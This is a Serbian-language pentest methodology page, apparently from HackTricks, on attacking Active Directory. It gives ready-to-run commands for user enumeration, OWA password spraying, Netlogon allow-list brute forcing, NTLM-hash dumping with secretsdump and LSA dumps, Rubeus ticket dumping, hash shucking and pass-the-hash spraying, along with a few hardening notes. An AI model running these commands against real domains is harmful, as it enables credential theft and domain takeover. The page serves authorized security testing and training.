# Metodologija Active Directory-ja

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja temeljnu tehnologiju koja omogućava **mrežnim administratorima** da efikasno kreiraju i upravljaju **domenima**, **korisnicima** i **objektima** unutar mreže. Projektovan je tako da može da se proširuje, što olakšava organizovanje velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura sistema **Active Directory** sastoji se od tri primarna sloja: **domena**, **stabala** i **šuma**. **Domen** obuhvata kolekciju objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** predstavljaju grupe ovih domena povezane zajedničkom strukturom, dok **šuma** predstavlja kolekciju više stabala međusobno povezanih putem **odnosa poverenja**, čineći najviši sloj organizacione strukture. Na svakom od ovih nivoa mogu se definisati posebna **prava pristupa** i **komunikacije**.

Ključni koncepti u okviru sistema **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije koje se odnose na Active Directory objekte.
2. **Object** – Označava entitete unutar direktorijuma, uključujući **korisnike**, **grupe** ili **deljene fascikle**.
3. **Domain** – Predstavlja kontejner za objekte direktorijuma, pri čemu više domena može da postoji unutar jednog **šuma**, a svaki domen održava sopstvenu kolekciju objekata.
4. **Tree** – Grupa domena koji dele zajednički korenski domen.
5. **Forest** – Najviši nivo organizacione strukture u sistemu Active Directory, sastavljen od nekoliko stabala sa međusobnim **odnosima poverenja**.

**Active Directory Domain Services (AD DS)** obuhvata niz usluga ključnih za centralizovano upravljanje i komunikaciju unutar mreže. Ove usluge uključuju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući funkcionalnosti **autentifikacije** i **pretrage**.
2. **Certificate Services** – Nadgleda kreiranje, distribuciju i upravljanje bezbednim **digitalnim sertifikatima**.
3. **Lightweight Directory Services** – Podržava aplikacije sa podrškom za direktorijum putem **LDAP protokola**.
4. **Directory Federation Services** – Omogućava funkcionalnost **single-sign-on** za autentifikaciju korisnika kroz više web aplikacija u okviru jedne sesije.
5. **Rights Management** – Pomaže u zaštiti materijala zaštićenog autorskim pravima regulisanjem njegove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Od ključne je važnosti za razrešavanje **domena**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Definicija Active Directory-ja**](https://techterms.com/definition/active_directory)

### **Kerberos autentifikacija**

Da biste naučili kako da **napadnete AD**, potrebno je da veoma dobro **razumete** proces **Kerberos autentifikacije**.\
[**Pročitajte ovu stranicu ako još uvek ne znate kako funkcioniše.**](kerberos-authentication.md)

## Cheat Sheet

Na stranici [https://wadcoms.github.io/](https://wadcoms.github.io) možete pronaći mnogo toga kako biste brzo pregledali koje komande možete pokrenuti za enumeraciju/eksploataciju AD-ja.

> [!WARNING]
> Kerberos komunikacija **zahteva potpuno kvalifikovano ime (FQDN)** za izvršavanje radnji. Ako pokušate da pristupite mašini pomoću IP adrese, **koristiće NTLM, a ne kerberos**.

## Recon Active Directory-ja (bez kredencijala/sesija)

Ako imate pristup AD okruženju, ali nemate nikakve kredencijale/sesije, možete:

- **Pentestovati mrežu:**
- Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **iskoristite ranjivosti** ili **izvučete kredencijale** iz njih (na primer, [štampači mogu biti veoma zanimljive mete](ad-information-in-printers.md).
- Enumeracija DNS-a može pružiti informacije o ključnim serverima u domenu, kao što su web serveri, štampači, deljenja, vpn, mediji itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte opštu [**Pentesting metodologiju**](../../generic-methodologies-and-resources/pentesting-methodology.md) da biste pronašli više informacija o tome kako ovo uraditi.
- **Proverite null i Guest pristup SMB servisima** (ovo neće raditi na modernim verzijama Windows-a):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič za enumeraciju SMB servera možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerišite Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič za enumeraciju LDAP-a možete pronaći ovde (obratite **posebnu pažnju na anonimni pristup**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Otrovati mrežu**
- Prikupite kredencijale [**oponašanjem servisa pomoću Responder-a**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupite hostu [**zloupotrebom relay napada**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Prikupite kredencijale **izlaganjem** [**lažnih UPnP servisa pomoću evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Izdvojite korisnička imena/imena iz internih dokumenata, društvenih mreža i servisa (uglavnom web) unutar domenskih okruženja, kao i iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih u kompaniji, možete pokušati sa različitim AD **konvencijama korisničkih imena (**[**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _ImePrezime_, _Ime.Prezime_, _ImePre_ (3 slova od svakog), _Ime.Pre_, _IPrezime_, _I.Prezime_, _PrezimeIme_, _Prezime.Ime_, _PrezimeI_, _Prezime.I_, 3 _nasumična slova i 3 nasumična broja_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonymous SMB/LDAP enum:** Pogledajte stranice [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži **nevažeće korisničko ime**, server će odgovoriti pomoću **Kerberos greške** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je korisničko ime nevažeće. **Važeća korisnička imena** će izazvati ili odgovor sa **TGT-om u AS-REP-u** ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da korisnik mora da izvrši pre-autentifikaciju.
- **Bez autentifikacije prema MS-NRPC**: Korišćenjem auth-level = 1 (bez autentifikacije) prema MS-NRPC (Netlogon) interfejsu na kontrolerima domena. Metod poziva funkciju `DsrGetDcNameEx2` nakon povezivanja sa MS-NRPC interfejsom kako bi proverio da li korisnik ili računar postoje bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovu vrstu enumeracije. Istraživanje je dostupno [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako ste pronašli jedan od ovih servera na mreži, možete izvršiti i **user enumeration nad njim**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Liste korisničkih imena možete pronaći u [**ovom github repo-u**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) i u ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena ljudi koji rade u kompaniji** iz recon koraka koji je trebalo da obavite pre ovoga. Na osnovu imena i prezimena možete koristiti script [**namemash.py**](https://gist.github.com/superkojiman/11076951) za generisanje potencijalno validnih korisničkih imena.

### Zloupotreba allow-list liste za ranjivi Netlogon kanal (Onelogon)

Čak i nakon što je **Zerologon** zakrpljen na DC-u, eksplicitno allow-listed nalozi i dalje mogu biti izloženi **legacy/vulnerable Netlogon secure-channel** ponašanju. Rizična konfiguracija je GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ili odgovarajuća registry vrednost **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta vrednost je **SDDL security descriptor** (pogledajte [Security Descriptors](security-descriptors.md)). Bilo koji nalog ili grupa kojima je dodeljen odgovarajući ACE u DACL-u mogu biti meta. Na primer, `O:BAG:BAD:(A;;RC;;;WD)` efektivno dodaje **Everyone** na allow-listu.

Praktičan operator workflow:

1. **Identifikujte allow-listed principals** proverom i **SYSVOL/GPO** i **live DC registry-ja**.
2. **Razrešite SID-ove** pronađene u SDDL-u u stvarne AD korisnike/računare i dajte prioritet **DC machine accounts**, **trust accounts** i drugim privilegovanim računarima.
3. Više puta pokušajte **MS-NRPC / Netlogon authentication** kao allow-listed nalog.
4. Nakon uspešnog pogađanja, zloupotrebite **Netlogon password-setting** da resetujete lozinku ciljnog naloga (javni PoC je postavlja na prazan string).<sup>[[9]](#references)[[10]](#references)</sup>

Brzi triage / lab primeri iz javno dostupnog artifact-a:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Napomene:

- **Scanner** je koristan zato što efektivna allow-lista može postojati u **SYSVOL**-u, **registry**-ju ili na oba mesta.
- Sam exploit path je važan zato što **ne zahteva Domain Admin privilegije** kada je ranjivi nalog već identifikovan.
- Kompromitovanje **Domain Controller machine account** naloga kao što je `DC$` naročito je opasno, jer resetovanje te lozinke može direktno omogućiti šire puteve za **AD takeover**.
- Izvodljivost **brute-force** napada zavisi od režima: javno dostupni artifact opisuje meet-in-the-middle pristup, **24-bit** brute force kada je dostupan još jedan computer account i sporije **32-bit** varijante.

Napomene za detekciju / hardening:

- Proverite allow-list policy i uklonite sve osim privremenih, izričito potrebnih compatibility exceptions.
- Pratite DC **System** evente **5827/5828/5829/5830/5831** kako biste otkrili ranjive Netlogon konekcije koje su odbijene, detektovane ili izričito dozvoljene policy-jem.
- Nalozima u `VulnerableChannelAllowList` pristupajte kao nalozima **visokog rizika** dok se legacy dependency ne ukloni.

### Poznavanje jednog ili više korisničkih imena

Ako već znate da imate validno korisničko ime, ali nemate lozinke... pokušajte sledeće:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_, možete **zatražiti AS_REP poruku** za tog korisnika, koja će sadržati podatke šifrovane derivacijom lozinke tog korisnika.
- [**Password Spraying**](password-spraying.md): Pokušajte sa najčešćim **lozinkama** za svakog otkrivenog korisnika; možda neki korisnik koristi lošu lozinku (imajte na umu password policy!).
- Imajte na umu da možete raditi **spray OWA servera** kako biste pokušali da dobijete pristup mail serverima korisnika.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **preuzmete** neke challenge **hash-eve** tako što ćete izvršiti **poisoning** nekih protokola **mreže**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ako ste uspeli da izvršite enumeraciju active directory-ja, imaćete **više email adresa i bolje razumevanje mreže**. Možda ćete moći da primenite [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) kako biste primorali NTLM na relay i dobili pristup AD env-u.

### NetExec workspace-driven recon & relay posture checks

- Koristite **`nxcdb` workspaces** da biste čuvali stanje AD recon-a po engagement-u: `workspace create <name>` kreira SQLite DB-ove po protokolu u `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Prebacujte prikaze pomoću `proto smb|mssql|winrm`, a prikupljene secrets izlistajte pomoću `creds`. Ručno uklonite osetljive podatke kada završite: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Brzo otkrivanje subnet-a pomoću **`netexec smb <cidr>`** prikazuje **domain**, **OS build**, **SMB signing requirements** i **Null Auth**. Članovi koji prikazuju `(signing:False)` podložni su **relay** napadima, dok DC-ovi često zahtevaju signing.
- Generišite **hostname-ove u /etc/hosts** direktno iz NetExec output-a kako biste olakšali targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay to the DC blokiran** zbog zahteva za signing, i dalje proverite stanje **LDAP-a**: `netexec ldap <dc>` ističe `(signing:None)` / slabi channel binding. DC kod kog je SMB signing obavezan, ali je LDAP signing onemogućen, i dalje predstavlja validnu metu za **relay-to-LDAP** zloupotrebe kao što je **SPN-less RBCD**.

### Client-side printer credential leaks → masovna validacija domen kredencijala

- Printer/web interfejsi ponekad **ugrađuju maskirane administratorske lozinke u HTML**. Pregled izvornog koda/devtools alata može otkriti lozinku u čistom tekstu (npr. `<input value="<password>">`), čime se omogućava Basic-auth pristup repozitorijumima za skeniranje/štampu.
- Preuzeti print jobs mogu sadržati **plaintext onboarding dokumente** sa lozinkama za pojedinačne korisnike. Prilikom testiranja održavajte parove usklađenim:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Ako možete **pristupiti drugim računarima ili share-ovima** koristeći **null ili guest user**, mogli biste **postaviti fajlove** (kao što je SCF fajl) koji će, ako im se na neki način pristupi, **pokrenuti NTLM autentikaciju prema vama**, tako da možete **ukrasti** **NTLM challenge** i pokušati da ga crackujete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već posedujete kao kandidat za lozinku u drugim, sporijim formatima čiji se ključni materijal direktno izvodi iz NT hash-a. Umesto brute-force napada na duge passphrase u Kerberos RC4 ticket-ima, NetNTLM challenge-ima ili keširanim credentialima, prosleđujete NT hash-eve Hashcat NT-candidate modovima i dozvoljavate mu da proveri reuse lozinke, a da pritom nikada ne saznate plaintext. Ovo je naročito moćno nakon kompromitovanja domena, kada možete prikupiti hiljade trenutnih i istorijskih NT hash-eva.<sup>[[5]](#references)</sup>

Koristite shucking kada:

- Imate NT corpus iz DCSync, SAM/SECURITY dump-ova ili credential vault-ova i treba da testirate reuse u drugim domenima/forest-ima.
- Uhvatite Kerberos materijal zasnovan na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore ili DCC/DCC2 blob-ove.
- Želite brzo da dokažete reuse dugih, necrackabilnih passphrase i odmah izvršite pivot putem Pass-the-Hash.

Ova tehnika **ne radi** protiv tipova enkripcije čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen nameće samo AES, morate se vratiti na regularne password modove.

#### Building an NT hash corpus

- **DCSync/NTDS** – Koristite `secretsdump.py` sa history opcijom da preuzmete najveći mogući skup NT hash-eva (i njihove prethodne vrednosti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History unosi značajno proširuju skup kandidata jer Microsoft može da čuva do 24 prethodna hash-a po nalogu. Za više načina za prikupljanje NTDS secrets pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) izvlači lokalne SAM/SECURITY podatke i keširane domain logon-e (DCC/DCC2). Uklonite duplikate i dodajte te hash-eve u isti `nt_candidates.txt` spisak.
- **Track metadata** – Čuvajte username/domain iz kog potiče svaki hash (čak i ako wordlist sadrži samo hex). Podudarni hash-evi vam odmah govore koji principal ponovo koristi lozinku kada Hashcat ispiše pronađenog kandidata.
- Prednost dajte kandidatima iz istog forest-a ili trusted forest-a; time se maksimizuje verovatnoća preklapanja tokom shucking-a.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Napomene:

- NT-candidate input-i **moraju ostati raw 32-hex NT hash-evi**. Onemogućite rule engine-e (bez `-r` i bez hybrid modova) jer mangling kvari materijal ključa kandidata.
- Ovi modovi nisu inherentno brži, ali je NTLM keyspace (~30,000 MH/s na M3 Max) oko 100× brži od Kerberos RC4 (~300 MH/s). Testiranje odabrane NT liste mnogo je jeftinije od istraživanja kompletnog password space-a u sporom formatu.
- Uvek pokrenite **najnoviji Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) jer su modovi 31500/31600/35300/35400 nedavno dodati.<sup>[[7]](#references)</sup>
- Trenutno ne postoji NT mode za AS-REQ Pre-Auth, a AES etype-ovi (19600/19700) zahtevaju plaintext password jer se njihovi ključevi izvode putem PBKDF2 iz UTF-16LE password-a, a ne iz raw NT hash-eva.

#### Primer – Kerberoast RC4 (mode 35300)

1. Uhvatite RC4 TGS za ciljni SPN koristeći low-privileged user (pogledajte Kerberoast stranicu za detalje):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Izvršite shuck ticket-a koristeći NT listu:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat izvodi RC4 ključ iz svakog NT kandidata i proverava `$krb5tgs$23$...` blob. Podudaranje potvrđuje da service account koristi jedan od vaših postojećih NT hash-eva.

3. Odmah izvršite pivot putem PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Po želji možete kasnije vratiti plaintext pomoću `hashcat -m 1000 <matched_hash> wordlists/`, ako je potreban.

#### Primer – Cached credentials (mode 31600)

1. Dump-ujte keširane logon-e sa kompromitovane radne stanice:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopirajte DCC2 liniju za zanimljivog domain user-a u `dcc2_highpriv.txt` i izvršite shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uspešno podudaranje daje NT hash koji je već poznat u vašoj listi, čime se dokazuje da keširani user ponovo koristi istu lozinku. Koristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-ujte u brzom NTLM modu da biste povratili string.

Potpuno isti workflow primenjuje se na NetNTLM challenge-response-ove (`-m 27000/27100`) i DCC (`-m 31500`). Kada identifikujete podudaranje, možete pokrenuti relay, SMB/WMI/WinRM PtH ili ponovo crackovati NT hash pomoću maski/rules offline.



## Enumerating Active Directory WITH credentials/session

Za ovu fazu morate imati **kompromitovane credentiale ili session validnog domain account-a.** Ako imate validne credentiale ili shell kao domain user, **treba da zapamtite da su prethodno navedene opcije i dalje opcije za kompromitovanje drugih user-a**.

Pre početka authenticated enumeration-a treba da znate šta je **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kompromitovanje account-a predstavlja **veliki korak ka početku kompromitovanja celog domena**, jer ćete moći da započnete **Active Directory Enumeration:**

Kada je reč o [**ASREPRoast**](asreproast.md), sada možete pronaći svakog potencijalno ranjivog user-a, a u vezi sa [**Password Spraying**](password-spraying.md) možete dobiti **spisak svih username-ova** i isprobati password kompromitovanog account-a, prazne password-e i nove obećavajuće password-e.

- Možete koristiti [**CMD za obavljanje osnovnog recon-a**](../basic-cmd-for-pentesters.md#domain-info)
- Takođe možete koristiti [**powershell za recon**](../basic-powershell-for-pentesters/index.html), što će biti stealthier
- Takođe možete [**koristiti powerview**](../basic-powershell-for-pentesters/powerview.md) za izvlačenje detaljnijih informacija
- Još jedan odličan alat za recon u active directory-ju je [**BloodHound**](bloodhound.md). On **nije naročito stealthy** (u zavisnosti od collection metoda koje koristite), ali **ako vam to nije važno**, svakako treba da ga isprobate. Pronađite gde user-i mogu da koriste RDP, pronađite putanju do drugih group-a itd.
- **Drugi automatizovani AD enumeration alati su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records AD-ja**](ad-dns-records.md), jer mogu sadržati zanimljive informacije.
- **Alat sa GUI-jem** koji možete koristiti za enumeraciju directory-ja jeste **AdExplorer.exe** iz **SysInternal** Suite-a.
- LDAP database možete pretraživati i pomoću **ldapsearch** da biste pronašli credentiale u poljima _userPassword_ i _unixUserPassword_, ili čak u polju _Description_. Pogledajte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) za druge metode.
- Ako koristite **Linux**, domen možete enumerisati i pomoću [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete pokušati i sa automatizovanim alatima kao što su:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Veoma je lako dobiti sve domain username-ove iz Windows-a (`net user /domain`, `Get-DomainUser` ili `wmic useraccount get name,sid`). U Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Čak i ako ovaj Enumeration odeljak deluje kratko, on je najvažniji deo svega. Otvorite linkove (pre svega one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok se ne budete osećali sigurno. Tokom assessment-a, ovo će biti ključni trenutak za pronalaženje puta do DA ili za odluku da se ništa ne može uraditi.

### Kerberoast

Kerberoasting podrazumeva pribavljanje **TGS ticket-a** koje koriste servisi povezani sa user account-ima i crackovanje njihove enkripcije — koja se zasniva na user password-ima — **offline**.

Više informacija o ovome:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Kada pribavite neke credentiale, možete proveriti da li imate pristup nekoj **mašini**. U tu svrhu možete koristiti **CrackMapExec** za pokušaj povezivanja na više servera preko različitih protokola, u skladu sa vašim port scan-ovima.

### Local Privilege Escalation

Ako ste kompromitovali credentiale ili session regularnog domain user-a i imate **pristup** sa tim user-om **bilo kojoj mašini u domenu**, treba da pokušate da pronađete način da **lokalno eskalirate privilegije i prikupite credentiale**. Razlog je to što ćete samo sa privilegijama lokalnog administratora moći da **dump-ujete hash-eve drugih user-a** iz memorije (LSASS) i lokalno (SAM).

U ovoj knjizi postoji kompletna stranica o [**local privilege escalation u Windows-u**](../windows-local-privilege-escalation/index.html) i [**checklist-a**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravite da koristite [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Veoma je **malo verovatno** da ćete pronaći **ticket-e** u trenutnom user **session-u** koji vam daju **dozvolu za pristup** neočekivanim resursima, ali možete proveriti:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ako ste uspeli da enumerišete Active Directory, imaćete **više email adresa i bolje razumevanje mreže**. Možda ćete moći da primorate NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Potraga za Creds u Computer Shares | SMB Shares

Sada kada imate neke osnovne credentials, trebalo bi da proverite da li možete da **pronađete** neke **interesantne fajlove koji se dele unutar AD-a**. To biste mogli da uradite ručno, ali to je veoma dosadan repetitivan zadatak (posebno ako pronađete stotine dokumenata koje treba da proverite).

[**Pratite ovaj link da biste saznali više o alatima koje možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Krađa NTLM Creds

Ako možete da **pristupite drugim računarima ili share-ovima**, mogli biste da **postavite fajlove** (kao što je SCF fajl) koji će, ako im se na neki način pristupi, **pokrenuti NTLM autentifikaciju prema vama**, tako da možete da **ukradete** **NTLM challenge** i crackujete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala svakom autentifikovanom korisniku da **kompromituje domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation na Active Directory-ju SA privileged credentials/session

**Za sledeće tehnike običan domain user nije dovoljan; potrebne su vam posebne privilegije/credentials za izvođenje ovih napada.**

### Ekstrakcija hash-eva

Nadamo se da ste uspeli da **kompromitujete neki local admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokalno podizanje privilegija](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da dump-ujete sve hash-eve iz memorije i sa lokalnog sistema.\
[**Pročitajte ovu stranicu o različitim načinima za dobijanje hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete ga iskoristiti za **impersonation** tog korisnika.\
Potrebno je da koristite neki **tool** koji će izvršiti **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete kreirati novu **sessionlogon** i **inject-ovati** taj **hash** u **LSASS**, tako da će, kada se izvrši bilo koja **NTLM autentifikacija**, biti korišćen taj **hash**. Poslednju opciju koristi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **iskoristi NTLM hash korisnika za zahtevanje Kerberos ticket-a**, kao alternativu uobičajenom Pass The Hash napadu preko NTLM protokola. Zbog toga ovo može biti naročito **korisno u mrežama u kojima je NTLM protokol onemogućen** i dozvoljen je samo **Kerberos** kao authentication protokol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Kod metode napada **Pass The Ticket (PTT)**, napadači **kradu authentication ticket korisnika** umesto njegove lozinke ili hash vrednosti. Ovaj ukradeni ticket se zatim koristi za **impersonation korisnika**, čime se dobija neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponovna upotreba Credentials

Ako imate **hash** ili **password** nekog **local admin** korisnika, trebalo bi da pokušate da se **ulogujete lokalno** na druge **PC-jeve** koristeći ga.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **noisy** i da bi **LAPS** to **mitigate**-ovao.

### MSSQL Abuse & Trusted Links

